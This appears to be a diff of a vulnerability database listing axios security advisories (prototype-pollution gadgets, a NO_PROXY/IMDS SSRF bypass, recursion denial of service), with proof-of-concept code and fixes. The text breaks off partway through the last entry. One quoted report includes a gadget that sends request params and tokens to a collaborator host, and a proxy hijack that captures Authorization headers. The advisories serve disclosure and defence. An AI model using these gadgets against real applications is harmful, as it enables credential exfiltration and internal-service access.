+                details: "## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
                 ]
               },
               {
@@ -19614,25 +21064,6 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 ]
               },
               {
-                atOrAbove: "1.0.0",
-                below: "1.16.0",
-                severity: "high",
-                cwe: [
-                  "CWE-918"
-                ],
-                identifiers: {
-                  summary: "The shouldBypassProxy function introduced in Axios 1.15.0 does not normalize IPv4-mapped IPv6 addresses, allowing bypass of NO_PROXY exclusions when requests use IPv4-mapped IPv6 notation to target excluded IPv4 addresses.",
-                  githubID: "GHSA-pjwm-pj3p-43mv",
-                  CVE: [
-                    "CVE-2026-44492"
-                  ]
-                },
-                details: "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                    \n                                                                                                                                                                                \n  // normalizeNoProxyHost strips brackets and trailing dots, but not ::ffff: prefix                                                                                             \n  return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));                                                                                             \n```\n                                                                                                                                                                                \nThe WHATWG URL parser canonicalises `http://[::ffff:127.0.0.1]/` to hostname `[::ffff:7f00:1]`. After bracket-stripping: `::ffff:7f00:1`. This string does not match 127.0.0.1 in NO_PROXY and is not in LOOPBACK_ADDRESSES, so shouldBypassProxy returns false and the proxy is used.  proxy-from-env (called before shouldBypassProxy) has the same gap - it does not equate ::ffff:7f00:1 with 127.0.0.1 - so neither layer catches the bypass.\n\n### PoC\n```javascript\n\n// NO_PROXY=127.0.0.1,localhost,::1  HTTP_PROXY=http://attacker:8080\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';                                                                                                       \n                                                                                                                                                                              \n// All three should return true (bypass proxy). Only the first two do.                                                                                                        \nconsole.log(shouldBypassProxy('http://127.0.0.1/'));          // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::1]/'));               // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::ffff:127.0.0.1]/')); // false <- bypass                                                                                             \nconsole.log(shouldBypassProxy('http://[::ffff:7f00:1]/'));     // false <- bypass\n\n```                                                                                              \n                                                                                                                                                                              \nNode.js routes ::ffff:7f00:1 to 127.0.0.1:                                                                                                                                    \n\n```                                                                                                                                                                              \n// net.connect({ host: '::ffff:7f00:1', port: 80 }) reaches a service                                                                                                       \n// bound to 127.0.0.1:80 \u2014 confirmed on Node.js v24, Linux and macOS.                                                                                                         \n```                                                                                                                                                                              \nCloud metadata SSRF: ::ffff:a9fe:a9fe = ::ffff:169.254.169.254. If NO_PROXY=169.254.169.254 is set to block IMDS access, a request to http://[::ffff:a9fe:a9fe]/latest/meta-data/ bypasses it.                                                                                                                      \n                                                                                                                                                                            \n#### Fix                                                                                                                                                                           \n                                                                                                                                                                            \nCanonicalise IPv4-mapped IPv6 in normalizeNoProxyHost before any comparison:                                                                                                  \n \n ```javascript                                                                                                                                                                           \nconst ipv4MappedDotted = /^::ffff:(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$/i;                                                                                                    \nconst ipv4MappedHex    = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i;                                                                                                         \n                                                                                                                                                                              \nfunction hexToIPv4(a, b) {                                                                                                                                                    \n  const hi = parseInt(a, 16), lo = parseInt(b, 16);                                                                                                                           \n  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;                                                                                                                   \n}                                                                                                                                                                             \n                                                                                                                                                                              \nconst normalizeNoProxyHost = (hostname) => {                                                                                                                                  \n  if (!hostname) return hostname;                                                                                                                                           \n  if (hostname[0] === '[' && hostname.at(-1) === ']')\n    hostname = hostname.slice(1, -1);                                                                                                                                         \n  hostname = hostname.replace(/\\.+$/, '').toLowerCase();\n                                                                                                                                                                              \n  let m;                                                                                                                                                                    \n  if ((m = hostname.match(ipv4MappedDotted))) return m[1];                                                                                                                    \n  if ((m = hostname.match(ipv4MappedHex)))    return hexToIPv4(m[1], m[2]);                                                                                                   \n  return hostname;                                                                                                                                                            \n};\n\n```\n\n### Impact\nAny application that sets NO_PROXY to exclude internal or metadata endpoints and uses an HTTP/HTTPS proxy can have those exclusions bypassed by a URL using IPv4-mapped IPv6 notation. The attacker must control the request URL. In cloud environments with instance metadata services, this can lead to credential exfiltration.",
-                info: [
-                  "https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv"
-                ]
-              },
-              {
                 atOrAbove: "1.7.0",
                 below: "1.16.0",
                 severity: "high",
@@ -19655,6 +21086,26 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 ]
               },
               {
+                atOrAbove: "1.15.0",
+                below: "1.16.0",
+                severity: "high",
+                cwe: [
+                  "CWE-289",
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "The shouldBypassProxy function introduced in Axios 1.15.0 does not normalize IPv4-mapped IPv6 addresses, allowing bypass of NO_PROXY exclusions when requests use IPv4-mapped IPv6 notation to target excluded IPv4 addresses.",
+                  githubID: "GHSA-pjwm-pj3p-43mv",
+                  CVE: [
+                    "CVE-2026-44492"
+                  ]
+                },
+                details: "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                    \n                                                                                                                                                                                \n  // normalizeNoProxyHost strips brackets and trailing dots, but not ::ffff: prefix                                                                                             \n  return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));                                                                                             \n```\n                                                                                                                                                                                \nThe WHATWG URL parser canonicalises `http://[::ffff:127.0.0.1]/` to hostname `[::ffff:7f00:1]`. After bracket-stripping: `::ffff:7f00:1`. This string does not match 127.0.0.1 in NO_PROXY and is not in LOOPBACK_ADDRESSES, so shouldBypassProxy returns false and the proxy is used.  proxy-from-env (called before shouldBypassProxy) has the same gap - it does not equate ::ffff:7f00:1 with 127.0.0.1 - so neither layer catches the bypass.\n\n### PoC\n```javascript\n\n// NO_PROXY=127.0.0.1,localhost,::1  HTTP_PROXY=http://attacker:8080\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';                                                                                                       \n                                                                                                                                                                              \n// All three should return true (bypass proxy). Only the first two do.                                                                                                        \nconsole.log(shouldBypassProxy('http://127.0.0.1/'));          // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::1]/'));               // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::ffff:127.0.0.1]/')); // false <- bypass                                                                                             \nconsole.log(shouldBypassProxy('http://[::ffff:7f00:1]/'));     // false <- bypass\n\n```                                                                                              \n                                                                                                                                                                              \nNode.js routes ::ffff:7f00:1 to 127.0.0.1:                                                                                                                                    \n\n```                                                                                                                                                                              \n// net.connect({ host: '::ffff:7f00:1', port: 80 }) reaches a service                                                                                                       \n// bound to 127.0.0.1:80 \u2014 confirmed on Node.js v24, Linux and macOS.                                                                                                         \n```                                                                                                                                                                              \nCloud metadata SSRF: ::ffff:a9fe:a9fe = ::ffff:169.254.169.254. If NO_PROXY=169.254.169.254 is set to block IMDS access, a request to http://[::ffff:a9fe:a9fe]/latest/meta-data/ bypasses it.                                                                                                                      \n                                                                                                                                                                            \n#### Fix                                                                                                                                                                           \n                                                                                                                                                                            \nCanonicalise IPv4-mapped IPv6 in normalizeNoProxyHost before any comparison:                                                                                                  \n \n ```javascript                                                                                                                                                                           \nconst ipv4MappedDotted = /^::ffff:(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$/i;                                                                                                    \nconst ipv4MappedHex    = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i;                                                                                                         \n                                                                                                                                                                              \nfunction hexToIPv4(a, b) {                                                                                                                                                    \n  const hi = parseInt(a, 16), lo = parseInt(b, 16);                                                                                                                           \n  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;                                                                                                                   \n}                                                                                                                                                                             \n                                                                                                                                                                              \nconst normalizeNoProxyHost = (hostname) => {                                                                                                                                  \n  if (!hostname) return hostname;                                                                                                                                           \n  if (hostname[0] === '[' && hostname.at(-1) === ']')\n    hostname = hostname.slice(1, -1);                                                                                                                                         \n  hostname = hostname.replace(/\\.+$/, '').toLowerCase();\n                                                                                                                                                                              \n  let m;                                                                                                                                                                    \n  if ((m = hostname.match(ipv4MappedDotted))) return m[1];                                                                                                                    \n  if ((m = hostname.match(ipv4MappedHex)))    return hexToIPv4(m[1], m[2]);                                                                                                   \n  return hostname;                                                                                                                                                            \n};\n\n```\n\n### Impact\nAny application that sets NO_PROXY to exclude internal or metadata endpoints and uses an HTTP/HTTPS proxy can have those exclusions bypassed by a URL using IPv4-mapped IPv6 notation. The attacker must control the request URL. In cloud environments with instance metadata services, this can lead to credential exfiltration.",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv"
+                ]
+              },
+              {
                 atOrAbove: "1.15.2",
                 below: "1.16.0",
                 severity: "low",
@@ -19673,6 +21124,251 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 info: [
                   "https://github.com/axios/axios/security/advisories/GHSA-654m-c8p4-x5fp",
                   "https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400",
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "Axios: Excessive recursion in formDataToJSON can cause denial of service",
+                  githubID: "GHSA-42h9-826w-cgv3",
+                  CVE: [
+                    "CVE-2026-67313"
+                  ]
+                },
+                details: "## Summary\nAxios versions `0.28.0` and later contain uncontrolled recursion in `formDataToJSON`, the helper behind the public `axios.formToJSON()` / named `formToJSON` API and the default request transform used when FormData is sent with an `application/json` content type.\n\nApplications are affected when they pass attacker-controlled `FormData` field names into this functionality. A field name with thousands of nested bracket segments can exhaust the JavaScript call stack and throw `RangeError: Maximum call stack size exceeded`, causing request failure and, in applications that do not handle the exception or rejected promise, possible process termination.\n\n## Impact\nThe impact is denial of service against applications that process untrusted `FormData` field names through axios' FormData-to-JSON conversion.\n\nThe vulnerable path is not reached by merely installing axios, by normal multipart `FormData` pass-through, or by ordinary axios requests that do not request JSON serialisation of `FormData`. In the default axios request, the error is produced before network I/O and returned as a rejected Promise. Direct use of `formToJSON()` throws synchronously.\n\nServer-side applications are the primary risk when remote users can submit arbitrary form field names, and the application converts those fields with `formToJSON()` or sends them through axios as JSON.\n\n## Affected Functionality\nAffected APIs and paths:\n- `axios.formToJSON(formData)`\n- `import { formToJSON } from \"axios\"`\n- `lib/helpers/formDataToJSON.js`\n- axios default `transformRequest` when `data` is `FormData` and `Content-Type` contains `application/json`\n\nUnaffected or lower-risk paths:\n- Normal multipart `FormData` requests without `JSON Content-Type`\n- `toFormData()` object-to-FormData serialisation, which already has a `maxDepth` guard\n- Axios versions before 0.28.0, where this helper and public API were not present\n\n## Technical Details\n`lib/helpers/formDataToJSON.js` parses a form field name into path segments with `parsePropPath()`. For a key such as `a[x][x][x]`, each bracketed segment becomes another path element.\n\n`formDataToJSON()` then calls the nested `buildPath(path, value, target, index)` function. `buildPath()` recursively calls itself once for each path segment and does not enforce a maximum depth:\n\n`const result = buildPath(path, value, target[name], index);`\n\nA key containing thousands of bracket segments, therefore, creates thousands of recursive calls. At sufficient depth, V8 throws `RangeError: Maximum call stack size exceeded`.\n\nAxios already applies a depth guard to the inverse serializer in `lib/helpers/toFormData.js`, where `maxDepth` defaults to 100 and exceeding it throws `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`. `formDataToJSON()` does not currently have equivalent protection.\n\n## Proof of Concept of Attack\n```js\nimport { formToJSON } from \"axios\";\n\nconst fd = new FormData();\nfd.append(\"a\" + \"[x]\".repeat(15000), \"value\");\n\ntry {\n  formToJSON(fd);\n  console.log(\"not vulnerable\");\n} catch (err) {\n  console.log(`${err.constructor.name}: ${err.message}`);\n}\n```\n\nExpected vulnerable result:\n\nRangeError: Maximum call stack size exceeded\n\nThe axios request transform path can also be reached before network I/O:\n\n```js\nimport axios from \"axios\";\n\nconst fd = new FormData();\nfd.append(\"a\" + \"[x]\".repeat(15000), \"value\");\n\nawait axios\n  .post(\"http://127.0.0.1:1/\", fd, {\n    headers: { \"Content-Type\": \"application/json\" }\n  })\n  .catch((err) => console.log(`${err.constructor.name}: ${err.message}`));\n```\n\nExpected vulnerable result:\n\nRangeError: Maximum call stack size exceeded\n\n## Workarounds\nApplications can avoid the vulnerable path by not converting attacker-controlled `FormData` to JSON with axios.\n\nIf conversion is required before a fixed axios release is available, validate `FormData` field names before calling `formToJSON()` or before sending `FormData` with `Content-Type: application/json`. Reject keys whose parsed nesting depth exceeds the application's expected schema.\n\nFor axios requests carrying untrusted `FormData`, avoid setting `Content-Type: application/json`; leaving the data as multipart FormData bypasses `formDataToJSON()`.\n\nCatching the resulting error can prevent process termination, but it does not remove the uncontrolled-recursion behaviour and should not be treated as the primary mitigation.\n\n<details>\n<summary>Original Report</summary>\n# Axios SSRF via Incomplete Loopback Detection\n## CWE-918 | CVSS 7.5 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\n\n---\n\n## 1. Classification\n\n| CWE | CVSS Score | Severity | Type |\n|-----|-----------|----------|------|\n| CWE-918 | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L) | HIGH | Server-Side Request Forgery |\n\n## 2. Description\n\n### Summary\nThe `shouldBypassProxy()` function in Axios fails to recognise `0.0.0.0`, `::`, and `::ffff:0.0.0.0` as loopback addresses. When `NO_PROXY=localhost` is configured, requests to these addresses are incorrectly forwarded through the proxy instead of being sent directly, enabling an SSRF attack against internal services reachable via the proxy's loopback interface.\n\n### Root Cause\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n**`isIPv4Loopback` (lines 3-8):** Only checks for `127.x.x.x` addresses by inspecting `parts[0] !== '127'`. The `0.0.0.0` address has `parts[0] === '0'`, so it falls through as non-loopback, even though on Linux `0.0.0.0` routes to the loopback interface.\n\n**`isIPv6Loopback` (lines 10-38):** Only checks `host === '::1'`. The `::` address (unspecified IPv6) also routes to the loopback, but is not recognised.\n\n**Attack Flow:**\n```\nisIPv4Loopback (line 3) \u2014 fails for 0.0.0.0\n  \u2192 isLoopback (line 44) \u2014 wraps both checks, returns false\n    \u2192 shouldBypassProxy (line 127) \u2014 PUBLIC API, exported default\n      \u2192 lib/adapters/http.js (line 190) \u2014 Node.js HTTP adapter\n```\n\n### Attack Vector\n- **Access Vector:** Network (AV:N)\n- **Access Complexity:** Low (AC:L) \u2014 attacker only needs control of a URL\n- **Privileges Required:** None (PR:N)\n- **User Interaction:** None (UI:N)\n\n## 3. Proof of Concept\n\n### Phase 1: Logic Verification\n\n```javascript\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';\n\n// Normal loopback \u2014 correctly returns true (bypasses proxy)\nshouldBypassProxy('http://127.0.0.1:9999/');  // \u2192 true\n\n// Vulnerable \u2014 returns false (goes through proxy!)\nshouldBypassProxy('http://0.0.0.0:9999/');    // \u2192 false  \u2190 SSRF\nshouldBypassProxy('http://[::]:9999/');        // \u2192 false  \u2190 SSRF\nshouldBypassProxy('http://[::ffff:0.0.0.0]:9999/'); // \u2192 false \u2190 SSRF\n```\n\n### Phase 2: Docker E2E Reproduction\n\nA full 3-container Docker reproduction was created and tested:\n\n- **Proxy container:** Simple HTTP forward proxy on port 8888\n- **Internal container:** Internal service on port 9999 (simulates sensitive internal resource)\n- **Attacker container:** Runs the test script with Axios source mounted\n\n**Reproduction steps:**\n```bash\ncd /tmp/deep-e2e\ndocker compose up -d\ndocker compose exec attacker node test-ssrf.js\n```\n\n**Results:**\n- Test 1: `127.0.0.1 + NO_PROXY=localhost` \u2192 BYPASS (correct) \n- Test 2: `0.0.0.0 + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n- Test 3: `[::] + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n- Test 4: `[::ffff:0.0.0.0] + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n\n### Phase 3: Actual Axios Client\n\nThe real Axios HTTP client (v1.16.1, source tree) was tested through proxy configuration:\n- Axios with `proxy: { host: 'proxy', port: 8888 }` \n- Setting `NO_PROXY=localhost` and requesting `http://0.0.0.0:9999/`\n- Result: Axios forwarded the request through the proxy instead of bypassing it\n\n## 4. Impact\n\n### Attack Scenario\n1. Attacker has control over a URL that an Axios client will request (direct input, redirect target, open redirect chain)\n2. The Axios client is configured with a proxy (e.g., corporate proxy) and `NO_PROXY=localhost` to protect internal services\n3. Attacker supplies `http://0.0.0.0:8080/admin` as the target URL\n4. Axios sends the request through the proxy\n5. The proxy resolves `0.0.0.0` \u2192 the proxy's own loopback \u2192 reaches the internal admin service on port 8080\n\n### Potential Consequences\n- **Information disclosure (C:L):** Internal service responses become accessible\n- **Integrity impact (I:L):** Attacker can trigger actions on internal services (if proxy supports PUT/POST/DELETE)\n- **Availability impact (A:L):** Limited \u2014 depends on internal service behavior\n\n### Likelihood\n- **High** \u2014 proxy bypass is a common pattern in microservice architectures\n- **Medium** \u2014 requires attacker control of a URL (not always available)\n\n## 5. Remediation\n\n### Code Fix\n\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n```javascript\nfunction isIPv4Loopback(host) {\n  if (host === '0.0.0.0') return true;  // ADD THIS LINE\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;\n  return parts.every(p => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n}\n\nfunction isIPv6Loopback(host) {\n  if (host === '::1' || host === '::') return true;  // ADD '::'\n  // ... rest of implementation\n}\n```\n\n### Workarounds\n- Add `0.0.0.0` and `::` to the `NO_PROXY` environment variable explicitly\n- Use `127.0.0.1` instead of `0.0.0.0` in all internal service URLs\n- Implement URL validation to reject `0.0.0.0` and `::` before passing to Axios",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "Axios: Nested axios option objects can consume polluted prototype values",
+                  githubID: "GHSA-7q8q-rj6j-mhjq",
+                  CVE: [
+                    "CVE-2026-67319"
+                  ]
+                },
+                details: "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    